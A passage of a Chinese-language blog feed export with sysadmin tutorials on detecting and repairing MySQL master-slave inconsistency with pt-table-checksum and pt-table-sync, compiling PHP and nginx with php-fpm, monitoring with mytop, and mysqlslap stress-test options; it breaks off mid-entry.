    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Mysql-主从复制不一致检测及解决方法"><a href="#Mysql-主从复制不一致检测及解决方法" class="headerlink" title="Mysql 主从复制不一致检测及解决方法"></a>Mysql 主从复制不一致检测及解决方法</h1><h3 id="主从不一致问题原因"><a href="#主从不一致问题原因" class="headerlink" title="主从不一致问题原因"></a>主从不一致问题原因</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Master端使用了不确定的语句(如:CURRENT_USER(), UUID())</span><br><span class="line">不正确的故障转移(failover)流程</span><br><span class="line">误操作或直接在Slave进行DML操作</span><br><span class="line">持续的升级更新(Rolling upgrades)</span><br><span class="line">混合使用事务引擎和非事务引擎的表</span><br><span class="line">跳过了复制事件 (SET GLOBAL SQL_SLAVE_SKIP_COUNTER = N)</span><br><span class="line">使用临时表(Temporary Tables)</span><br><span class="line">复制过滤(Replication Filters)</span><br><span class="line">使用含LIMIT且没有order by的更新语句(update/delete with LIMIT clause without order by)</span><br><span class="line">等。。。。。。</span><br></pre></td></tr></table></figure>


<h3 id="检测工具-pt-table-checksum"><a href="#检测工具-pt-table-checksum" class="headerlink" title="检测工具 pt-table-checksum"></a>检测工具 pt-table-checksum</h3><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pt-table-checksum原理</span><br><span class="line"></span><br><span class="line">1）、单行数据checksum值的计算</span><br><span class="line"></span><br><span class="line">Pt工具先检查表的结构，并且获取表中每一列的数据类型，把所有数据类型都转化为字符串，然后使用concat_ws()函数进行连接，然后使用crc32计算出该行的checksum值。</span><br><span class="line"></span><br><span class="line">2）、数据块checksum值的计算</span><br><span class="line"></span><br><span class="line">如果一行一行去计算checksum值，再去和从库比较，效率会很低。pt-table-checksum可以利用表中的索引，将表的数据split成一个个chunk，计算的时候也是以chunk为单位。pt-table-checksum引入了聚合函数BIT_XOR()。它的功能可以理解为将这个chun k内的所有行数据拼接起来，再计算CRC32的值，就得到了这个chunk的checksum值。</span><br><span class="line"></span><br><span class="line">3）、pt-table-checksum通过在主服务器上执行检查语句，在线检查MySQL复制的一致性，生成replace语句，然后传递到从服务器，再通过update更新master_src的值。通过检测从服务器的this_src和master_src的值从而判断复制是否一致。</span><br></pre></td></tr></table></figure>



<h5 id="Yum-安装"><a href="#Yum-安装" class="headerlink" title="Yum 安装"></a>Yum 安装</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1.安装软件包：</span><br><span class="line"><span class="meta">#</span><span class="bash"> yum -y  install perl perl-devel perl-Time-HiRes perl-DBI perl-DBD-MySQL</span></span><br><span class="line">2.	安装工具percona-toolkit</span><br><span class="line"><span class="meta">#</span><span class="bash"> yum -y install http://www.percona.com/downloads/percona-release/redhat/0.1-4/percona-release-0.1-4.noarch.rpm</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum list | grep percona-toolkit</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> yum -y install percona-toolkit</span></span><br></pre></td></tr></table></figure>

<h5 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">1. 安装pt-table-checksum</span><br><span class="line"><span class="meta">#</span><span class="bash"> wget http://www.percona.com/get/percona-toolkit.tar.gz</span></span><br><span class="line">2.	解压并安装</span><br><span class="line"><span class="meta">#</span><span class="bash"> tar zxvf percona-toolkit.tar.gz</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> percona-toolkit-3.0.13</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> perl Makefile.PL</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> make &amp;&amp; make install</span></span><br><span class="line">安装完成后：</span><br><span class="line">pt-table-checksum</span><br><span class="line">pt-table-sync 检查安装是否成功</span><br></pre></td></tr></table></figure>

<h5 id="安装错误排查"><a href="#安装错误排查" class="headerlink" title="安装错误排查"></a>安装错误排查</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">如果报错：</span><br><span class="line">erl: relocation error: /usr/lib64/perl5/vendor_perl/auto/DBD/mysql/mysql.so</span><br><span class="line">如有报错：</span><br><span class="line">DBD::mysql::db do failed: Access denied; you need (at least one of) the SUPER privilege(s) for this operation [for Statement "/*!50105 SET @@binlog_format="STATEMENT"*/"] at /usr/local/bin/mk-table-sync line 8568.</span><br><span class="line">Issuing rollback() due to DESTROY without explicit disconnect() of DBD::mysql::db handle ;host=192.168.1.101;port=3306;mysql_read_default_group=client at /usr/local/bin/mk-table-sync line 8568.</span><br><span class="line">解决办法：安装DBI和DBD-MySQL</span><br><span class="line">下载地址：</span><br><span class="line">http://ftp.cuhk.edu.hk/pub/packages/perl/CPAN/authors/id/T/TI/TIMB/</span><br><span class="line">http://search.cpan.org/dist/DBD-mysql/ </span><br><span class="line">或者百度云盘下载：https://pan.baidu.com/s/1miv0S8g （提取密码：fh24）</span><br><span class="line"></span><br><span class="line">[root@master-server src]# tar -zvxf DBI-1.634.tar.gz </span><br><span class="line">[root@master-server src]# cd DBI-1.634</span><br><span class="line">[root@master-server DBI-1.634]# perl Makefile.PL</span><br><span class="line">[root@master-server DBI-1.634]# make &amp;&amp; make install</span><br><span class="line">[root@master-server src]# tar -zvxf DBD-mysql-4.041_01.tar.gz </span><br><span class="line">[root@master-server src]# cd DBD-mysql-4.041_01</span><br><span class="line">[root@master-server DBD-mysql-4.041_01]# perl Makefile.PL --mysql_config=/usr/local/mysql/bin/mysql_config         //主库mysql安装路径/usr/local/mysql</span><br><span class="line">[root@master-server DBD-mysql-4.041_01]# make</span><br><span class="line">[root@master-server DBD-mysql-4.041_01]# make install</span><br></pre></td></tr></table></figure>



<h5 id="检测工具介绍"><a href="#检测工具介绍" class="headerlink" title="检测工具介绍"></a>检测工具介绍</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a.	为了减少不必要的麻烦，确保你的 repl_user@'xxx' 用户能同时登陆主库和从库</span><br><span class="line">b.	--create-replicate-table 选项会自动创建 percona.checksums 表，但也意味着赋予额外的 CREATE TABLE权限给 percona_tk@'xxx' 用户。默认yes</span><br><span class="line">c.	PROCESS用于自动发现从库信息，SUPER权限用于set binlog_format。</span><br><span class="line">d.	--no-check-replication-filters 表示不需要检查 Master 配置里是否指定了 Filter。 默认会检查，如果配置了 Filter，如      replicate_do_db,replicate-wild-ignore-table,binlog_ignore_db 等，在从库checksum就与遇到表不存在而报错退出，所以官方默认是yes（--check-replication-filters）但我们实际在检测中时指定--databases=，所以就不存在这个问题，干脆不检测</span><br><span class="line">e.	--empty-replicate-table：每个表checksum开始前，清空它之前的检测数据（不影响其它表的checksum数据），默认yes。当然如果使用--resume启动检测数据不会清空。</span><br><span class="line">当启用--noempty-replicate-table即不清空时，不计算计算chunk,只计算。</span><br><span class="line">f.	--databases=，-d：要检查的数据库，逗号分隔。用脚趾头想也知道 --databases-regex 正则匹配要检测的数据库，--ignore-databases[-regex]忽略检查的库。Filter选项。</span><br><span class="line">g.	--tables=，-t：要检查的表，逗号分隔。如果要检查的表分布在不同的db中，可以用--tables=dbname1.table1,dbnamd2.table2的形式。同理有--tables-regex，--ignore-tables，--ignore-tables-regex。--replicate指定的checksum表始终会被过滤。</span><br><span class="line">h.	--recursion-method：发现从库的方式。pt-table-checksum 默认可以在主库的 processlist中找到从库复制进程，从而识别出有哪些从库，但如果使用是非标准3306端口，会导致找不到从库信息。此时就会自动采用host方式，但需要提前在从库 my.cnf 里面配置report_host、report_port信息，如：</span><br><span class="line">    report_host = MASTER_HOSt report_port = 1330</span><br><span class="line">最终极的办法是dsn，dsn指定的是某个表（如 percona.dsns ），表行记录是改主库的（多个）从库的连接信息。适用以下任一情形：</span><br><span class="line">主库不能自动发现从库</span><br><span class="line">不想在从库添加额外配置（因为要重启）</span><br><span class="line">主从检测连接用户信息不一样</span><br><span class="line">多个从库时只想验证指定从库的一致</span><br><span class="line">我比较倾向使用DSN的方式。这个dsns表只需要在执行 pt-table-checksum 命令的服务器上能够访问到就行。这里纠正一个认识，网上很多人说 pt-table-checksum 要在主库上执行，其实不是的，我的mysql实例比较多，只需在某一台服务器上安装percona-toolkit，这台服务能够同时访问主库和从库就行了。具体用法见后面实例。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pt-table-checksum注意事项：</span><br><span class="line">a.	  根据测试，需要一个即能登录主库，也能登录从库的账号；</span><br><span class="line">b.	  只能指定一个host，必须为主库的IP；</span><br><span class="line">c.	  在检查时会向表加S锁；</span><br><span class="line">d.	如果master和slave的binlog日志不是STATEMENT格式，要用--no-check-binlog-format选项</span><br><span class="line">e.	  运行之前需要从库的同步IO和SQL进程是YES状态。</span><br><span class="line">f.	 表要有主键索引或唯一键索引</span><br><span class="line"></span><br><span class="line">更多参数参考--help</span><br></pre></td></tr></table></figure>

<h5 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">两种写法：</span><br><span class="line"><span class="meta">#</span><span class="bash"> pt-table-checksum  --host=172.26.246.102 --port=3306 --user=repl --password=123456 --databases=employees </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> pt-table-checksum h=172.26.246.104,P=3306,u=repl,p=<span class="string">'123456'</span> --databases=employees</span></span><br><span class="line">如果报错如下：</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/11/29/Mysql%20%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%B8%8D%E4%B8%80%E8%87%B4%E6%A3%80%E6%B5%8B%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/image-20200821162855536.png" alt="image-20200821162855536"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">在命令后添加：</span><br><span class="line">--no-check-binlog-format</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2018/11/29/Mysql%20%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6%E4%B8%8D%E4%B8%80%E8%87%B4%E6%A3%80%E6%B5%8B%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/image-20200821162920012.png" alt="image-20200821162920012"></p>
<h5 id="结果详解"><a href="#结果详解" class="headerlink" title="结果详解"></a>结果详解</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">TS ：完成检查的时间。</span><br><span class="line">ERRORS ：检查时候发生错误和警告的数量。</span><br><span class="line">DIFFS ：0表示一致，1表示不一致。当指定--no-replicate-check时，会一直为0，当指定--replicate-check-only会显示不同的信息。</span><br><span class="line">ROWS ：表的行数。</span><br><span class="line">CHUNKS ：被划分到表中的块的数目。</span><br><span class="line">SKIPPED ：由于错误或警告或过大，则跳过块的数目。V </span><br><span class="line">TIME ：执行的时间。</span><br><span class="line">TABLE ：被检查的表名。</span><br></pre></td></tr></table></figure>



<h5 id="操作讲解"><a href="#操作讲解" class="headerlink" title="操作讲解"></a>操作讲解</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">--host   h  主机，指定master可以自动查找所有slave</span><br><span class="line">--user   u  用户</span><br><span class="line">--password p 密码</span><br><span class="line">--port   P  端口</span><br><span class="line">--databases  数据库</span><br><span class="line">--tables   数据表</span><br><span class="line">--no-check-binlog-format  如果master和slave的binlog日志不是STATEMENT格式，要用--no-check-binlog-format选项</span><br></pre></td></tr></table></figure>



<h3 id="修复工具-pt-table-sync"><a href="#修复工具-pt-table-sync" class="headerlink" title="修复工具 pt-table-sync"></a>修复工具 pt-table-sync</h3><h5 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pt-table-sync原理：</span><br><span class="line"></span><br><span class="line">顾名思义，它用来修复多个实例之间数据的不一致，它可以让主从的数据修复到最终一致。</span><br><span class="line"></span><br><span class="line">1、    单行数据checksum值的计算</span><br><span class="line"></span><br><span class="line">和pt-table-checksum一样，也是先检查表结构，并获取每一列的数据类型，把所有数据类型都转化为字符串，然后用concat_ws()函数进行连接，由此计算出该行的checksum值。Checksum默认采用crc32计算。</span><br><span class="line"></span><br><span class="line">2、    数据块checksum值的计算</span><br><span class="line"></span><br><span class="line">和pt-table-checksum工具一样，pt-table-sync会将表的数据split成若干个chunk，计算的时候以chunk为单位。可以理解为将chunk内的所有行的数据拼接起来，再计算crc32的值，既可以得到该chunk的checksum值。</span><br><span class="line"></span><br><span class="line">3、    数据修复</span><br><span class="line"></span><br><span class="line">前面两步，pt-table-sync与pt-table-checksum的算法和原理是一样的。再往下，就开始有所不同了：</span><br><span class="line"></span><br><span class="line">pt-table-checksum只是校验，它把checksum结果存储到统计表，然后把执行过的sql语句记录到binlog，任务就算完成。语句级的复制把计算逻辑传递到从库，并且在从库执行相同的计算。</span><br><span class="line"></span><br><span class="line">pt-table-sync则不同，它首先要完成chunk的checksum值计算，一旦发现主从上相同的chunk的checksum值不一样，就会深入到该chunk内部，逐行比较并且修复有问题的行。它的计算逻辑描述如下：</span><br><span class="line"></span><br><span class="line">1）、对每一个从库，每一个表，循环进行如下校验和修复过程。</span><br><span class="line"></span><br><span class="line">2）、对每一个chunk，校验时加上for update锁。一旦获得锁，就记录下当前主库的show master status值。</span><br><span class="line"></span><br><span class="line">3）、在从库上执行select master_pos_wait()函数，等待从库的sql线程执行到show master status得到位置。以此保证，主从上关于这个chunk的内容不再改变。【select master_pos_wait(‘master_log_file’,’master_log_pos’);该函数会阻塞直到从服务器达到指定的日志文件和偏移量。此时从服务器和主服务器就同步了，语句返回值为0】.</span><br><span class="line"></span><br><span class="line">4）、对这个chunk执行checksum计算，然后与主库的checksum进行比较。</span><br><span class="line"></span><br><span class="line">5）、如果checksum相同，说明主从数据一致，接着就可以继续下一个chunk。</span><br><span class="line"></span><br><span class="line">6）、如果checksum值不同，说明该chunk有不一致。就会深入到chunk内部，逐行计算checksum并比较（单行checksum的比较过程与chunk的比较过程一样，单行实际是chunk的size等于1的特例）。</span><br><span class="line"></span><br><span class="line">7）、如果发现某行不一致，则标记下来。继续检测剩余行，直到这个chunk结束。</span><br><span class="line"></span><br><span class="line">8）、对找到的主从不一致的行，采用replace into语句，在主库上执行一遍以生成该行全量的binlog， 并同步到从库，这就会以主库数据为基准来修复从库；对于主库有的，而从库没有的行，采用replace into在主库上插入（注意，不能是insert。这分为两种情况：一是有唯一性主键，如果有唯一性主键或者索引，则insert相同记录会在主库上插入失败；二是没有唯一性主键或者索引，insert相同记录会造成记录重复。故要求pt-table-sync的表必须要有唯一性主键或者索引）。</span><br><span class="line"></span><br><span class="line">9）、直到修复该chunk所有不一致的行。继续检查和修复下一个chunk。</span><br><span class="line"></span><br><span class="line">10）、直到这个从库上的所有表修复结束。接着继续修复下一个从库。</span><br></pre></td></tr></table></figure>



<h5 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pt-table-sync h=172.26.246.104,u=repl,p=123456,P=3306 --databases=employees --tables=dept_emp --replicate=percona.checksums --<span class="built_in">print</span> --execute</span></span><br><span class="line">可以在修复之前先打印查看</span><br><span class="line"></span><br><span class="line">--charset=utf8--ignore-databases=mysql,sys,percona --ignore-tables=test5.test_nu  忽略某些库表的参数</span><br></pre></td></tr></table></figure>



<h2 id="常见错误"><a href="#常见错误" class="headerlink" title="常见错误"></a>常见错误</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">a.    Diffs cannot be detected because no slaves were found</span><br><span class="line"> 不能自动找到从库，确认processlist或host或dsns方式用对了。</span><br><span class="line"></span><br><span class="line">b.   Cannot connect to h=slave1.*.com,p=...,u=percona_user</span><br><span class="line"> 可以在pt-table-checksum命令前加PTDEBUG=1来看详细的执行过程，如端口、用户名、权限错误。</span><br><span class="line"></span><br><span class="line">c.    Waiting for the --replicate table to replicate to XXX</span><br><span class="line"> 问题出在 percona.checksums 表在从库不存在，根本原因是没有从主库同步过来，所以看一下从库是否延迟严重。</span><br><span class="line"></span><br><span class="line">d.   Pausing because Threads_running=25</span><br><span class="line"> 反复打印出类似上面停止检查的信息。这是因为当前数据库正在运行的线程数大于默认25，pt-table-checksum 为了减少对库的压力暂停检查了。等数据库压力过了就好了，或者也可以直接 Ctrl+C 终端，下一次加上--resume继续执行，或者加大--max-load=值。</span><br><span class="line"></span><br><span class="line">e.    字符集问题</span><br><span class="line"></span><br><span class="line">Error checksumming table Error executing checksum query: DBD::mysql::st execute failed: Illegal mix of collations</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>主从复制</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下编译安装以及配置PHP环境</title>
    <url>/2019/02/17/Linux%E4%B8%8B%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEPHP%E7%8E%AF%E5%A2%83/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linux下编译安装以及配置PHP环境"><a href="#Linux下编译安装以及配置PHP环境" class="headerlink" title="Linux下编译安装以及配置PHP环境"></a>Linux下编译安装以及配置PHP环境</h1><h2 id="安装准备"><a href="#安装准备" class="headerlink" title="安装准备"></a>安装准备</h2><p> 依次执行下面命令,不存在的就搜差不多的就行,下面安装的都是后面安装环境可能需要用上的依赖,不管37是不是21,复制粘贴就是了</p>
<p><strong>Ubuntu安装:</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt-get update    </span><br><span class="line"></span><br><span class="line">sudo apt-get install    gcc    autoconf    openssl    libssl-dev    curl    libcurl4-gnutls-dev    libjpeg-dev    libpng16-dev    freetype   libpcre3 libpcre3-dev    libxslt1.1 libxslt1-dev    bzip2    libbz2-dev</span><br></pre></td></tr></table></figure>

<p><strong>centos安装:</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum -y install gcc openssl openssl-devel curl curl-devel libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel pcre pcre-devel libxslt libxslt-devel bzip2 bzip2-devel</span><br></pre></td></tr></table></figure>

<h2 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h2><h3 id="1-php下载以及安装"><a href="#1-php下载以及安装" class="headerlink" title="1.php下载以及安装"></a>1.php下载以及安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">下载: wget http://am1.php.net/distributions/php-7.3.2.tar.gz  </span><br><span class="line"></span><br><span class="line">解压: tar -zxvf php-7.3.2.tar.gz </span><br><span class="line"></span><br><span class="line">进入目录开始编译安装:</span><br><span class="line"></span><br><span class="line">./configure --prefix=/opt/soft/php --enable-fpm</span><br><span class="line"></span><br><span class="line">下面是直接把常用的扩展安装好,免得后面在一个一个安装(推荐)</span><br><span class="line"></span><br><span class="line">./configure --prefix=/opt/soft/php  --with-curl --with-mysqli --with-openssl --with-pdo-mysql --enable-fpm</span><br><span class="line">make</span><br><span class="line">sudo make install</span><br><span class="line"></span><br><span class="line">设置快捷访问方式: sudo cp /opt/soft/php/bin/php /usr/local/bin/</span><br><span class="line">把php配置文件放在正确的位置</span><br><span class="line">确认正确位置:php -i | grep php.ini</span><br><span class="line">在下载的安装包中将php配置文件移动过来: </span><br><span class="line">sudo cp /opt/packages/php-7.3.2/php.ini-production /opt/soft/php/lib/php.ini</span><br><span class="line"></span><br><span class="line">ps:以后可以通过 php --ini 查看文件所在位置</span><br></pre></td></tr></table></figure>

<h3 id="2-nginx下载以及安装"><a href="#2-nginx下载以及安装" class="headerlink" title="2.nginx下载以及安装"></a>2.nginx下载以及安装</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">和上面php一样的步骤,下载--解压--编译--安装</span><br><span class="line">wget http://nginx.org/download/nginx-1.14.2.tar.gz</span><br><span class="line">./configure --prefix=/opt/soft/nginx --sbin-path=/opt/soft/nginx/sbin/nginx --conf-path=/opt/soft/nginx/config/nginx.conf --error-log-path=/opt/soft/nginx/logs/error.log --pid-path=/opt/soft/nginx/logs/nginx.pid --http-log-path=/opt/soft/nginx/logs/access.log --with-http_stub_status_module --with-http_ssl_module</span><br><span class="line">sudo make &amp;&amp; make install</span><br><span class="line">设置快捷访问方式: sudo cp /opt/soft/nginx/sbin/nginx /usr/local/bin/</span><br><span class="line">简单配置nginx(详细配置后面再重新开文章写),然后浏览器直接访问ip就能访问了(这个时候只能访问html,访问php是直接下载文件)</span><br></pre></td></tr></table></figure>

<p><img src= "/img/loading.gif" data-src="/2019/02/17/Linux%E4%B8%8B%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEPHP%E7%8E%AF%E5%A2%83/image-20200820211016275.png" alt="image-20200820211016275"></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">开启nginx: sudo nginx(sudo nginx -s reload 重启nginx), 查看是否开起nginx: sudo netstat -anp | grep 80(端口号)</span><br></pre></td></tr></table></figure>

<h3 id="3-配置nginx支持php"><a href="#3-配置nginx支持php" class="headerlink" title="3.配置nginx支持php"></a>3.配置nginx支持php</h3><p>nginx不能直接和php通信,需要借助FastCGI(高速地在HTTP服务器和动态脚本语言间通信的接口),需要用到php-fpm(FastCGI Process Manager：FastCGI进程管理器, 他的具体概念可以参照这里<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fblog.csdn.net%2Fu010785091%2Farticle%2Fdetails%2F78705690" target="_blank" rel="noopener">搞清楚php-FPM到底是什么</a>),这也是为什么在编译安装php的时候需要带–enable-fpm这个扩展的原因.</p>
<p>I. 启动php-fpm</p>
<p>进入到  /opt/soft/php/etc 这个目录将php-fpm.conf.default改名为php-fpm.conf,编辑他查看最后一行</p>
<p><img src= "/img/loading.gif" data-src="/2019/02/17/Linux%E4%B8%8B%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEPHP%E7%8E%AF%E5%A2%83/image-20200820211059754.png" alt="image-20200820211059754"></p>
<p> 然后进入最后一行指向php-pm.d目录,将<a href="http://www.conf.default改名成www.conf,并编辑成对应账号,我这里是xunan" target="_blank" rel="noopener">www.conf.default改名成www.conf,并编辑成对应账号,我这里是xunan</a></p>
<p><img src= "/img/loading.gif" data-src="/2019/02/17/Linux%E4%B8%8B%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEPHP%E7%8E%AF%E5%A2%83/image-20200820211119920.png" alt="image-20200820211119920"></p>
<p>然后将/opt/soft/php/sbin/php-fpm设置快捷访问方式,并启动php-fpm,也就是执行下面两个命令</p>
<p>  sudo cp /opt/soft/php/sbin/php-fpm /usr/local/bin/    sudo php-fpm</p>
<p>  ps: 重启php-fpm: 先ps aux | grep php-fpm,然后kill掉对应的进程</p>
<p>  II. 配置nginx支持php</p>
<p><img src= "/img/loading.gif" data-src="/2019/02/17/Linux%E4%B8%8B%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEPHP%E7%8E%AF%E5%A2%83/image-20200820211136582.png" alt="image-20200820211136582"></p>
<p> 具体配置:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> location ~ \.php$ &#123;</span><br><span class="line">     try_files $uri &#x2F;index.php &#x3D;404;</span><br><span class="line">     fastcgi_split_path_info ^(.+\.php)(&#x2F;.+)$;</span><br><span class="line">     fastcgi_pass  127.0.0.1:9000;</span><br><span class="line">     fastcgi_index index.php;</span><br><span class="line">     fastcgi_param  SCRIPT_FILENAME $document_root$fastcgi_script_name;</span><br><span class="line">     include    fastcgi_params;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>  按照上面配置完成后,在配置文件的root目录下建立一个index.php,编辑</p>
<p><img src= "/img/loading.gif" data-src="/2019/02/17/Linux%E4%B8%8B%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEPHP%E7%8E%AF%E5%A2%83/image-20200820211223303.png" alt="image-20200820211223303"></p>
<p>然后重启nginx(sudo nginx -s reload),在浏览器ip访问</p>
<p><img src= "/img/loading.gif" data-src="/2019/02/17/Linux%E4%B8%8B%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E9%85%8D%E7%BD%AEPHP%E7%8E%AF%E5%A2%83/image-20200820211239200.png" alt="image-20200820211239200"></p>
]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>编译安装</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql 监控</title>
    <url>/2018/11/21/Mysql%20%E7%9B%91%E6%8E%A7/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">工具：mytop</span><br><span class="line">介绍：</span><br><span class="line">man mytop</span><br><span class="line">-u / --user &lt;USERNAME&gt;：指定 username，预设是 root</span><br><span class="line">-p / --pass / --password &lt;PASSWORD&gt;：指定password，预设是none</span><br><span class="line">-h / --host &lt;HOSTNAME[:PORT]&gt;：指定 MySQL server的hostname，预设是localhost</span><br><span class="line">-P / --port &lt;PORT&gt;：指定连接 MySQL server的port，预设是3306</span><br><span class="line">-s / --delay &lt;SECONDS&gt;：更新的秒数，预设是5秒</span><br><span class="line">-d / --db / --database &lt;DATABASE&gt;：指定连接的资料库，预设是test</span><br><span class="line">-b / --batch / --batchmode：指定为 batch mode，每次更新不会清除旧的显示结果，会将更新资料显示上最上方，预设是unset</span><br><span class="line">-S / --socket &lt;PATH_TO_SOCKET&gt;：指定使用MySQL socket直接连线，而不使用TCP/IP连线，预设是none(当mytop和MySQL在同一台时才能使用)</span><br><span class="line">--header or -noheader：是否要显示表头，预设是header</span><br><span class="line">--color or --nocolor：是否要使用颜色，预设是color</span><br><span class="line">-i / -idle or -noidle：idle 的thread是否要出现在清单上，预设是idle</span><br><span class="line"></span><br><span class="line">安装：</span><br><span class="line">yum install yum-plugin-protectbase.noarch -y</span><br><span class="line">yum install mytop -y</span><br><span class="line">vim /root/.mytop</span><br><span class="line">host=localhost</span><br><span class="line">user=root</span><br><span class="line">pass=QianFeng@123</span><br><span class="line">db=mysql</span><br><span class="line">port=3306</span><br><span class="line">socket=/tmp/mysql.sock</span><br><span class="line">delay=5</span><br><span class="line">batchmode=0</span><br><span class="line">color=1 </span><br><span class="line">idle=1</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
        <tag>mytop</tag>
      </tags>
  </entry>
  <entry>
    <title>Mysql 压力测试</title>
    <url>/2018/11/13/Mysql%20%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Mysql-压力测试"><a href="#Mysql-压力测试" class="headerlink" title="Mysql 压力测试"></a>Mysql 压力测试</h1><p>实验环境</p>
<p>系统： centos 7.6</p>
<p>配置：2核8G 磁盘 essd</p>
<p>mysql版本：5.7.29</p>
<p>压测工具：mysqlslap</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">常用参数 [options] 详细说明：</span><br><span class="line"></span><br><span class="line">--auto-generate-sql, -a 自动生成测试表和数据，表示用mysqlslap工具自己生成的SQL脚本来测试并发压力。</span><br><span class="line">--auto-generate-sql-load-type=type 测试语句的类型。代表要测试的环境是读操作还是写操作还是两者混合的。取值包括：read，key，write，update和mixed(默认)。</span><br><span class="line">--auto-generate-sql-add-auto-increment 代表对生成的表自动添加auto_increment列，从5.1.18版本开始支持。</span><br><span class="line">--number-char-cols=N, -x N 自动生成的测试表中包含多少个字符类型的列，默认1</span><br><span class="line">--number-int-cols=N, -y N 自动生成的测试表中包含多少个数字类型的列，默认1</span><br><span class="line">--number-of-queries=N 总的测试查询次数(并发客户数×每客户查询次数)</span><br><span class="line">--query=name,-q 使用自定义脚本执行测试，例如可以调用自定义的一个存储过程或者sql语句来执行测试。</span><br><span class="line">--create-schema 代表自定义的测试库名称，测试的schema，MySQL中schema也就是database。</span><br><span class="line">--commint=N 多少条DML后提交一次。</span><br><span class="line">--compress, -C 如果服务器和客户端支持都压缩，则压缩信息传递。</span><br><span class="line">--concurrency=N, -c N 表示并发量，也就是模拟多少个客户端同时执行select。可指定多个值，以逗号或者--delimiter参数指定的值做为分隔符。例如：--concurrency=100,200,500。</span><br><span class="line">--engine=engine_name, -e engine_name 代表要测试的引擎，可以有多个，用分隔符隔开。例如：--engines=myisam,innodb。</span><br><span class="line">--iterations=N, -i N 测试执行的迭代次数，代表要在不同并发环境下，各自运行测试多少次。</span><br><span class="line">--only-print 只打印测试语句而不实际执行。</span><br><span class="line">--detach=N 执行N条语句后断开重连。</span><br><span class="line">--debug-info, -T 